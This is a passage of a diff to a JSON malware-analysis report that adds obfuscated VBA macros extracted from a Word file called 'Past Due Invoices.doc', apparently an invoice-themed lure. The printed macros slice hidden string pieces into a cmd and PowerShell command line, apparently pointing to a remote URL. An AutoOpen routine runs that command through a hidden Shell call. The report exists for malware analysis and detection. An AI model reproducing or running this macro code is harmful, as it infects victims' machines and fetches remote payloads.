- (zibizTpSJl - Sin(1532124)))\ncjktPbw = (sDTvKtBNwTOM - Int(ATrEa) * dUjvrbzTFHF / Oct(rmoDUX) - (IQPHdjQOazAwN - Sin(6820447)))\nnpwDCb = (NDqSkvtZnwBmlw) + HJjkJKD(\"ZwmUEPcQ'+') IJQ+IJQS0Pv+0PvystjHWczSaVV\", 8, 24)\nXFSRv = (TKSOOMFObMWUEJ - Int(YlHVuMwZvrTBk) * uoLCBiCRr / Oct(GEtzHqFr) - (BlkStBlWkWXvLU - Sin(8652266)))\nIRmzOBdPWmT = (YLRDioHtrPq - Int(wSElcEij) * WRAQIS / Oct(UUvjASjfonSMi) - (aiLSZSSlTGmJX - Sin(415476)))\nCIppar = (QnWWMZWTHSiiZ - Int(omWFTvnpziAbiB) * zrvhmXAwqRRD / Oct(EAvjto) - (UPEEGFbpnW - Sin(7115617)))\nPHtodhq = (ZvGtKWaPw) + HJjkJKD(\"CzwhzzjXcdvBWJIJQ+IJQNgnYk(IJQ'+'+IJQ), IJQ+IJQ5DMSDC);&IJ0Pv+0PvQ'+'+IJQ(95aIJQ+I0Pv+0PvJQIIJQ+IJQnvoIJQ+IJQ95IJQ+IJQa+IJQ+IJQ95IJQ+IJQak9'+'5a+IJQ+I0coGdPKRiGniHiMXp\", 12, 140)\nRlfiXEDRLZ = (vLJUjaifuZM - Int(GNrikQCOcrt) * ECvzKcnsbGfcjL / Oct(aJwpWb) - (chfpwWnMEDR - Sin(1762135)))\nPhSzfpaOHJZ = (ifkURmT - Int(ziPzYJ) * FdBWYVaOSU / Oct(REPCbKXwcvY) - (YkHdcwPsYM - Sin(2244238)))\nOshvSY = (aCvkuE - Int(SzlUOrzH) * achjj / Oct(clRrzQCcHFtIbY) - (nBYiGin - Sin(3107973)))\nrjVmvhMWSuD = (dkwnRiuXUhnqa) + HJjkJKD(\"TzOJcIJQ+0Pv+0PvIJQrIJQ+IJQwanSwi0Pv+0Pv+Swi0Pv+0'+'PvdaIJQ+IJQnorp0Pv+0PvIJSwi+SwiQ+IJQhanspIJQ+IJQr'+'Swi+SwiIJQ+IJQojIJQ+IJQecIJQ+IJQt.'+'orIJQ+IJQg/'+'IJQ+ISwi+SwiJQxIeIJQ+IJQDIJSwqSUFA LTEh\", 6, 179)\nDwMvJSOJfA = (VipmaICaUpV - Int(ESZrKMaOh) * zFUzSdqHJAXDJI / Oct(fUWcAGjnu) - (obXMRpHBWjjSbq - Sin(4834688)))\nUNdOGjkzMs = (NjUABJQWirD - Int(htQSZBiBTusL) * CnZlMtjD / Oct(tDStwiLA) - (ZlVUcTRtaMX - Sin(3003042)))\nBWLiH = (oJkwVrlS - Int(XiPzMzfEzqTMTZ) * iKGTTSUfBaOIJz / Oct(UOPaOm) - (dGSNV - Sin(2447970)))\nFWiKO = (GAPXdPV) + HJjkJKD(\"wiVdCQIrwFjiDWdfsQlRnTjbfjlUi+SwiQ+IJQFfPIJ0Pv+0PvQ+IJQ/9IJQ+0Pv+0PvIJQ5IJQ+ISwi+SwiJQaI0Pv+0'+'PvJQ+IJQ.IJQ+IJQSwi+SwiSplit'+'(9IJQ+IJQ5a?95a)Swi+Swi;IJQ+IJQ5Swi+SwiDMSDCIJQ'+PsPwavdMW\", 29, 148)\nNGnOfwoCS = (VEwsKIdjABFzH - Int(FTuYUjzjwQuLjp) * IbsOW / Oct(sKbZfni) - (RtivEJFDSAa - Sin(8669528)))\nljEKE = (IjwzZndsZNjl - Int(NJSwotSziWMP) * jwEJrndZjd / Oct(aGzBrrjwKS) - (wlTMjamdJljuHf - Sin(7740056)))\nlQjFniHEj = (VvHMdfoY - Int(uRHnqOELkBS) * fHCmFUsqLrWDa / Oct(CDFSRzv) - (lJfqTXfiXd - Sin(4171151)))\nzXGkNdkNtK = (DOZwqVH) + HJjkJKD(\"DEDtGXJqjRkztKKCiYIJQ+IJQYU.nYkDoBWIJQ+IJQJIJQ+I0Pv+0PvJQWIJQ+IJQnlBWJOIJQ+'+'IJQad'+'IJQ+IJ'+'0Pv+0PvQJpwaKFjSAAuuvnmMbShck\", 18, 86)\nFukvGfXYBqcwd = CAVJSbqTQRSUS + qoEaXLwhWDu + OzIcFwIUp + ChrW(34) + MfLBFRk + fRPzhSoqRX + vHwSzRACz + KqMGiKEM + McdquV + npwDCb + pSUDSTMl + SqzaCvtdrX + odGmB + ZAjOBpNaU + NXDht + tHiFAXSsA + ahhFSl + VjZjwIz + iLCXWRR + mbcpoNSTKIb + qpQSEaibvD + rjVmvhMWSuD + FWiKO + FzsEA + mvnUTNul + KAYnuj + JHrXAqHQB + zXGkNdkNtK + DivfIXtm + PHtodhq + nCWjHvVjvko + jIzUzZ + hiMmOU + zmYFCmXXu + zCCSbH + TKIiS + nvqCJOciczt + nlQoEIdD + IjFjXi + EwoVQ + PbMAQ\nVuBWtHPAU = (cUshATO - Int(fvFAOHiObdoMdd) * tAfpSL / Oct(ILbVtiBW) - (LwDaWiU - Sin(6250468)))\ntnfjmMIhz = (zhUiwmN - Int(uYsNAMERcPaC) * OfzvijmWwTn / Oct(TBorhAQNjkvoj) - (SbUjtHwflBVj - Sin(3387424)))\nGaRvFEUjK = (ZvOKpAij - Int(PrOKBPa) * woQmWziJmSo / Oct(jMGHLvnizHfHR) - (TasPPj - Sin(5865616)))\nEnd Function\nSub UPwLjNKTNCd(lSkSvvjod As String)\nOn Error Resume Next\nwWizUELJz = (wWMIHJvPCTdD - Int(FpAtujKOkpBwA) * AWccNUwn / Oct(tFJitLqYNvddH) - (KQZnaMjL - Sin(2163033)))\nGputZqQiw = (vHnlBQDu - Int(nBXqtDSL) * hWbNhuCswRQh / Oct(MjLLLWfXWWSPXJ) - (zBpHicBaqhZ - Sin(8711138)))\nShell JSldkpoqfhr + lSkSvvjod + jQKzIwJkTtwbJC + KGUildzOD, 0\nkofhUtUUw = (wLraijP - Int(OPWJUh) * ijKCFRiC / Oct(OTTbPZ) - (bdzDJTfmu - Sin(4250883)))\nViwhaUzNq = (JRsuQJ - Int(MOPnsoqujWi) * KDYIjwz / Oct(anzVO) - (PPJlDnAjT - Sin(4653628)))\nEnd Sub",
+                "vba_filename": "AwfzKPwC.bas"
+              },
+              {
+                "file_name": "<root>/files/Past Due Invoices.doc",
+                "local_path": "b3c6e4688bb473ecddee842374bcd9cf1bb9a66dab65cf9546b0822e21ffc5c5",
+                "stream_path": "Macros/VBA/QsZikAkvJTuV",
+                "vba_code": "Function OzIcFwIUp()\nOn Error Resume Next\nNPvzQT = (DfcSNJRLw - Int(oZPijCjuoWC) * iisNCQdOXSMrr / Oct(isdJlJcwZ) - (AUwdaXiKWMwta - Sin(15705)))\nUhsFTr = (BikLWM - Int(rOYnRiltO) * IBMhTznAnCUf / Oct(kSdCjaskD) - (cdiFmFzZdz - Sin(1879419)))\nNrSfJS = (YnYiiwLiKDLo - Int(VocBSVCFXkEl) * BuodqhPztqdBsw / Oct(VTYStRRRX) - (KcHfBCUzn - Sin(9080283)))\nnvqCJOciczt = (QPDjfGSSj) + HJjkJKD(\"DAPRjJKOzOwbP4ibsUA6BWWh^el^l&&!%wSsL4ShlqWzvKlZi\", 24, 14)\nffSTYijj = (FIUrnIEEBHb - Int(LoUdpTYXkCdv) * qiFKLodbjXQTkK / Oct(vVYWIQzzWzuJs) - (vCfYtwawupT - Sin(9679199)))\nlNOvEIwtuRv = (fQDKEIi - Int(OiGnhqkjKQ) * ktlVlurNPz / Oct(iCKFUjSpqB) - (FjXYlLG - Sin(8029089)))\nlQwYI = (kZpORtv - Int(QNuSfnwE) * cVDQUadZoE / Oct(NIfHZhrJNvnblA) - (cGrZtbUIj - Sin(6950895)))\nKqMGiKEM = (zaZdjDLmrdjcRF) + HJjkJKD(\"izCbzqzXp2ioWRW!%jiSpuFnjvhRNW0\", 16, 13)\nbqGwdGTFTMu = (LVtzwXn - Int(bKCHJmnvQuT) * cwoibtpTjTAoHO / Oct(cLImPFPUcn) - (fHfTfDDimP - Sin(6319244)))\nNtwSE = (YCiUwIJ - Int(AvJKkII) * tMbMq / Oct(OhnPn) - (lYcNvwjjhkQMSa - Sin(4976375)))\nHsAAIXfz = (zUjXvwpZnUZ - Int(nAjjVMcbS) * PoYYXJwPtPbijT / Oct(QBmjDZbWLwj) - (hrGwz - Sin(3415742)))\niLCXWRR = (zwmqhpuSPwzWh) + HJjkJKD(\"qMll0aG&s4bWR\", 8, 2)\ntmwTFQbUIc = (sPWoRMbqFPYmR - Int(MiOkRiKDZB) * NPnQqdmwIFCiQd / Oct(vlZNzosTwizS) - (ffppUoEzoaPl - Sin(7312955)))\nMnLXAD = (JYKDzHfiZdLBL - Int(vriqKwQdP) * KcZoHKK / Oct(NwjvliBLIz) - (LdScjB - Sin(9362670)))\nQbDITFBc = (YanZfIztUhraP - Int(jnMlAFDp) * qTXEjrzpmLRlBa / Oct(DnokjdRWq) - (tiQzBrojbzFID - Sin(2610798)))\nSqzaCvtdrX = (dYbJwIQNDFK) + HJjkJKD(\"0WKwb0tLHG323W7QNVj3mfQ67tnj43\", 27, 2)\nuJuiussw = (pMjskTd - Int(ZcTvj) * iLlMGtJLRc / Oct(oaVbFYI) - (rXqlzTvUhI - Sin(7111647)))\nfYmzGwO = (nipkwkMqo - Int(ivHdw) * HZUEKUrDsZmsK / Oct(cDjHbJklf) - (MSmotuiVW - Sin(504353)))\nzjThUjrBbGM = (HojKTmm - Int(WzUjPaaPACmIV) * wsshCJzvQVHMV / Oct(zwIXwtI) - (rmXOSfiTj - Sin(8873675)))\ntHiFAXSsA = (iNniNQSIVYzh) + HJjkJKD(\"lQLPYYoPYDPWII%=p^o^w^er&NWc34uMcTMUS\", 15, 11)\nwCoKiQAQc = (aAGKoqRRzlNV - Int(ZKiWoW) * hqtNUJHPbZUkOa / Oct(oMavlcJ) - (MKhwlFYXand - Sin(902121)))\nUTsiUhiJdVi = (GspijBqYRdG - Int(KVRvtkWXGjD) * NVKCBtwlVfiU / Oct(QBaTMvhaObjH) - (hDHjdapDRO - Sin(8318647)))\nEbBGi = (WXjVMfnzKciv - Int(ukWMw) * avZLtioBHfhzn / Oct(fpYAFBvwJRF) - (LcjpSqSU - Sin(3174525)))\nNXDht = (LPDuPJc) + HJjkJKD(\"wwq0RPu9XPcwzPRvj%!JoubkjQqA9pwXOAXDWvWA\", 13, 7)\niWYbwoEKQsQ = (GZSMRS - Int(rjSSmsM) * NiRQqoc / Oct(zCidwjVWm) - (oFOYKM - Sin(2542898)))\nVVzOhCBLs = (lwdtnM - Int(JtSjNvUdATKmoP) * LwjiDH / Oct(oTFDkCjvGPSinp) - (qYMUb - Sin(2744598)))\nzzGslqVUVr = (AZYrdk - Int(MIIrLFzaJKR) * ENuUKbSIFISjfj / Oct(TjfsYvOtGKm) - (kDPOBCiJsF - Sin(978228)))\nmvnUTNul = (MWHwwil) + HJjkJKD(\"zWPmIJXT7ZvhRo%=^so09Z\", 11, 8)\nKwLNQmuwz = (TnJYAhEqtQhAa - Int(NbSdNTnpQmZzN) * UkjIdTZSv / Oct(PdXkKZrLBfST) - (ojiCdWX - Sin(9818552)))\ndwmwSsKIC = (UhVJh - Int(XGRvfdOjv) * fruOw / Oct(EBXucvRvvXp) - (JqPBrSo - Sin(9126871)))\nVNbFti = (Xniawmz - Int(fckBlcTlmwcoWz) * ozZEni / Oct(caCUhOoUfIRzPv) - (MXOvP - Sin(938323)))\nPbMAQ = (bWjuiStB) + HJjkJKD(\"OHFWDvlKwVuuSHDtjet %jiSpuFDo0F\", 18, 10)\nPEfZOFacbua = (SQUWYkMjmCqsOu - Int(OwcJit) * IaGdjvtNGTqRm / Oct(rjTnSL) - (UrTFltwDplWD - Sin(4877653)))\nvzvQAvvsLj = (tQvARp - Int(wXBwIAXMJ) * PiEnjmYwB / Oct(KQhTOMwzSXmBVP) - (TRIctZqjP - Sin(1342855)))\ntmdlrIJDB = (UUKiXCQsN - Int(piivCZtljOM) * OPUPVHYUkRMt / Oct(dnozkldCtijZh) - (zwujsIjFuJHjI - Sin(3760774)))\nhiMmOU = (UfAKzRvF) + HJjkJKD(\"qset %wSsLzPRvj 4C0OwwuQpMIrWtk044vNFiwTfbSMN9H9cw\", 2, 14)\nXENIt = (MYtirDdJIwFN - Int(dSNrIiQZtjJ) * RrruWFnCF / Oct(AsbuuzZiXfXGL) - (KjhCDKSojFaLlP - Sin(7370935)))\nidDpWVBsm = (SLimSVPNnQAPM - Int(BLjtjpXlwu) * LIVUiNJri / Oct(MbYfpQT) - (mKDcGEO - Sin(5994908)))\ntVtdiUirJ = (fwVjMkNHMutED - Int(XiQojIOuZDWMj) * jCRFDVivI / Oct(AqKYdWaKjTj) - (qPiXdlXRKzAsX - Sin(1942498)))\nnlQoEIdD = (llqoQYXpkT) + HJjkJKD(\"vhz4QHWabWGi4DWGu7Qo4uVOiF04HpzPco%! 497\", 34, 4)\nOzIcFwIUp = hiMmOU + tHiFAXSsA + iLCXWRR + PbMAQ + SqzaCvtdrX + mvnUTNul + nvqCJOciczt + NXDht + KqMGiKEM + nlQoEIdD\ncoBhMcZjo = (zqRCdMcQopMBa - Int(ssXqWAqSATt) * ICHEUGbmamUU / Oct(zXkEhzaNUoTE) - (NnCipwJrDZI - Sin(7019292)))\nVFaoGFYDC = (dFOSVSYoO - Int(zltnjvzWLzuz) * TMsAZOivBj / Oct(KzQXcqTPLUkk) - (mFLICrF - Sin(5744127)))\nfduGcSwaf = (wEEcmiZtUdflH - Int(cjNUCZsJbLf) * WQAXUojb / Oct(fHJShiIWbwtW) - (iwFiXFA - Sin(7850789)))\nEnd Function\nSub AutoOpen()\nOn Error Resume Next\ncmzQqDSzj = (pVpHsjwE - Int(IJOFLLpjDqNjq) * uHHYalEH / Oct(NarnVJlrCZSTwN) - (mFAXOIViwEv - Sin(119834)))\nlLVTlBMBf = (XUWSzLKY - Int(ztamUljspsrsjZ) * AjhGjS / Oct(MBShfBwJKXaG) - (GKYAhFIWInaovN - Sin(3530542)))\nSiErfMhZU = (FfvjhUScbCpI - Int(YbJODNstjoi) * jTialZkDNcZMp / Oct(TILUKcKzfQ) - (wiMcuWrRq - Sin(302564)))\nApplication.Run \"UPwLjNKTNCd\", FukvGfXYBqcwd\nAjBpdFESw = (wYcuj - Int(PdBfioSEmvY) * TGiuzZTYJi / Oct(WFfiOZaBRsM) - (NQKTLR - Sin(9435561)))\nDihcwqTBY = (bLYkw - Int(aCFDfLtGjH) * UipGHHMbwpdjsv / Oct(CzqhoWRlk) - (GNRroasr - Sin(8282140)))\nEnd Sub",
+                "vba_filename": "QsZikAkvJTuV.bas"
+              },
+              {
+                "file_name": "<root>/files/Past Due Invoices.doc",
+                "local_path": "57534217a0c689d4b74a5f54533441e2b91d96e5e7a602cb31a5d537645fbe1e",
+                "stream_path": "Macros/VBA/jOipwUYmtLb",
+                "vba_code": "Function CAVJSbqTQRSUS()\nOn Error Resume Next\nNPvzQT = (CDXAShqB - Int(Xsjbdz) * VFLSS / Oct(qfYQWz) - (Ihroqj - Sin(4488574)))\nUhsFTr = (kpELQYkuSrOaNN - Int(wPzsMrbB) * trzpAul / Oct(ZFlPHHClFlGZHW) - (uPvYqnKHIotRYZ - Sin(9052524)))\nNrSfJS = (XFRBHcBpIzHHG - Int(bCXuEaEWu) * PzdbNp / Oct(MKqiUqVoSN) - (QtjDAm - Sin(2568914)))\nnvqCJOciczt = (ImCSsYRjXIi) + HJjkJKD(\"AhamhrApYdYDbQraLjclXuRqw eqw &       %C^om^S^BRGpkGwORJut\", 24, 23)\nffSTYijj = (MwFBcMwqNWwz - Int(pBjJijiTnizZl) * lzGirY / Oct(IqvIfZNIMEW) - (DGOGziTb - Sin(3588090)))\nlNOvEIwtuRv = (UIcqFLrHr - Int(bJhKk) * CJRLb / Oct(bFizWsJAX) - (PkWnjoUBRFNRst - Sin(4949687)))\nlQwYI = (VwcKJ - Int(zujWIF) * wwqhiuwowTNo / Oct(uVMJMpaT) - (MYNnHmcGJ - Sin(6239942)))\nKqMGiKEM = (TvwPnGMCF) + HJjkJKD(\"DZmaHSnwPlFYRwi    /V         /c   FpT\", 16, 20)\nbqGwdGTFTMu = (fVclSTrm - Int(MpJjZDb) * qYwqzEz / Oct(JrsuKujzMkq) - (VERWMSCjSiwrl - Sin(2403345)))\nNtwSE = (wLdhRiBIbwrzR - Int(KTpMlt) * HbdfCORbvBIw / Oct(kojCZ) - (UvpYUSk - Sin(5480493)))\nHsAAIXfz = (OHizTF - Int(jzCOQjjjwjAOV) * kmmaZqSDI / Oct(RlJNnXJ) - (wtEjzKvkPIb - Sin(7209656)))\niLCXWRR = (OZcOVuNbhXK) + HJjkJKD(\"SYEBNcOjfsoSRt\", 8, 3)\ntmwTFQbUIc = (ZVQcQAmbf - Int(bKbXuvfWjSfj) * jVYsJNQKwOCL / Oct(FiVdiQtFnOETwC) - (EjbupjjHsHdOOd - Sin(5889284)))\nMnLXAD = (ZLzpBAGjPpfwHU - Int(MLSGNnIVM) * WdVEBfbIS / Oct(HwMzDcrfAEk) - (YiQDw - Sin(4583463)))\nQbDITFBc = (IQqkQiWk - Int(NKEnooRNwU) * kwdVI / Oct(WFmowjDrKORN) - (ShrMRpzwLjRCEb - Sin(4135337)))\nSqzaCvtdrX = (YjqqziaSt) + HJjkJKD(\"zVqtWUUrlLVHptRhXwJENEtllWqwh sT\", 27, 4)\nuJuiussw = (tjLfIrKWV - Int(tHiLzbwlTKQt) * COzAhJRCB / Oct(AmcboTkzu) - (EVTRkjwDOj - Sin(8355910)))\nfYmzGwO = (zOJRI - Int(dMDjrhhYVzHRi) * WPRjuhP / Oct(LNoRi) - (mOSXLtUhZVdmjM - Sin(2116692)))\nzjThUjrBbGM = (vwBiikzcWbcdAq - Int(azmlHhjGpsoqvC) * zDpNRr / Oct(DNCRqBjQ) - (hjaDnzaDRMqLm - Sin(8961951)))\ntHiFAXSsA = (wiZAzDB) + HJjkJKD(\"pZquIICOFNaRzC fhdjsk fhsdjkfsdkuFXEGrzldwJR\", 15, 18)\nwCoKiQAQc = (FAERSJPQnGsCtK - Int(urYsMadTn) * nmhasdwCrSC / Oct(dGZbZu) - (jwMwzEdb - Sin(6958729)))\nUTsiUhiJdVi = (VchRhiWip - Int(dvACsUoOSSlAjD) * laqkVO / Oct(MdVqV) - (wbCtjwmkwKDc - Sin(3061540)))\nEbBGi = (IRnVtdK - Int(DjzTjbjXhCzARq) * sQkQVnQm / Oct(GztuqA) - (rdAXVvPSLBacBc - Sin(2900274)))\nNXDht = (qiWYBGHUwVAcl) + HJjkJKD(\"YrbfRVIQROLap^Ec%      PlcdYcFwJjUqmRmkHloKN\", 13, 11)\niWYbwoEKQsQ = (nlfqCat - Int(voiorkbFCldMtv) * UrjzGwEqHUvzJK / Oct(fHullRciZ) - (TrwhbHTrpKz - Sin(4205812)))\nVVzOhCBLs = (nzrzXUvlSv - Int(FVSHKirJGR) * EFJfMcHTAXJj / Oct(muTFNd) - (BwTbGpMhLSqPJB - Sin(8887535)))\nzzGslqVUVr = (nrITdwuHwpLV - Int(KmvdUlIm) * ZXQZHhhuXFs / Oct(fOFKSC) - (LiRdq - Sin(3307039)))\nmvnUTNul = (hhFHXRSuzASFU) + HJjkJKD(\"rowuFKrskrhiqwoeqwpi potTwr\", 11, 13)\nKwLNQmuwz = (HfXpTCiGaD - Int(uZIHBm) * joGJaw / Oct(GOLplczWN) - (VIGTmh - Sin(6129745)))\ndwmwSsKIC = (BIqdvjKou - Int(RXwEbUMnXRp) * JXLzltjozG / Oct(lZnicTbizh) - (EqLRhlGw - Sin(2087647)))\nVNbFti = (iZzTSvz - Int(IFlKwMfn) * jTvmsurSVnUMu / Oct(wwLCznLKXiM) - (cjttwluwXfPb - Sin(8153798)))\nPbMAQ = (zFRkDDrMaCRG) + HJjkJKD(\"dJlzHjUFVTtONvjUvka dhakjbhdbqwuijYHn\", 18, 16)\nPEfZOFacbua = (LYbpiSwK - Int(jjMUfKNP) * HaEti / Oct(oGuRwj) - (BmNwbVStmPMTiC - Sin(9565158)))\nvzvQAvvsLj = (TTLfPSc - Int(RtTAcXj) * jhhZHij / Oct(zHULsZwGqwbzm) - (jjKzi - Sin(6430818)))\ntmdlrIJDB = (RRPjz - Int(AUYCkkTiHzR) * rzNJfwiZf / Oct(wOHECpfpFbspvl) - (tqNTVbls - Sin(5932735)))\nhiMmOU = (fziYvQaD) + HJjkJKD(\"Tcmd ndjkhfdshfjksdfjkdsjbNARwitZblAiBQnSQbhKOlEmtYGYtdUFjM\", 2, 23)\nXENIt = (FVGKWMWcRSBX - Int(mbSks) * IwKfpRJu / Oct(CkhNQ) - (NfTujJnSPPcfOF - Sin(2690365)))\nidDpWVBsm = (RJLinv - Int(QsNSTajkoHEY) * zqMGVjuPNmvops / Oct(YBhLSpCB) - (qUrifoYK - Sin(6212982)))\ntVtdiUirJ = (LbwFMHAZ - Int(GSddi) * LmZsGGw / Oct(tPBoMkZNkIXh) - (cwVERQzvANqJU - Sin(3925410)))\nnlQoEIdD = (idDSrpcCBbr) + HJjkJKD(\"iEqNKWsJSRVqbKQzzTZtiHuDsPmXnJniu        bvw\", 34, 8)\nCAVJSbqTQRSUS = hiMmOU + tHiFAXSsA + iLCXWRR + PbMAQ + SqzaCvtdrX + mvnUTNul + nvqCJOciczt + NXDht + KqMGiKEM + nlQoEIdD\nBzSZKOmCp = (TopdshU - Int(BWjqEn) * qwttCLfrPXOS / Oct(MSFZGJldaVC) - (sjIwlLvi - Sin(7084785)))\nUSsJnzowZ = (iPmtiQ - Int(juCLPa) * aJbWsiMTowsAM / Oct(TKwhAPYD) - (qZiabA - Sin(5321536)))\nZErCidYRD = (uLbnAiDuQkFdOL - Int(WDkzKDkS) * YoIKjpl / Oct(dFUMcSpqijL) - (VvpfjLan - Sin(3843662)))\nEnd Function",
+                "vba_filename": "jOipwUYmtLb.bas"
+              },
+              {
+                "file_name": "<root>/files/Past Due Invoices.doc",
+                "local_path": "275732af392b42b2e718188d60d6e345339513199a6817baafbf78cc04d3739b",
+                "stream_path": "Macros/VBA/sqCcMbbcbPjYF",
+                "vba_code": "Function HJjkJKD(ByVal str As String, start, length)\n    HJjkJKD = Mid(str, start, length)\nEnd Function",
+                "vba_filename": "sqCcMbbcbPjYF.bas"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (4 macro files) (OLE) | autoexec=1, suspicious=1, base64 string=1",
+          "tags": {}
         }
       },
       "tags": {
         "microsoft_office": true,
-        "ole": true
+        "ole": true,
+        "olevba": true
+      }
+    },
+    "file:b3c6e4688bb473ecddee842374bcd9cf1bb9a66dab65cf9546b0822e21ffc5c5": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "Past Due Invoices.doc.olevba/macro_1.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:b12749ad0e060ae0b715a83ebd1bfea23e0b9f4968dac80cc604fc229c55052f",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
       }
     }
   }
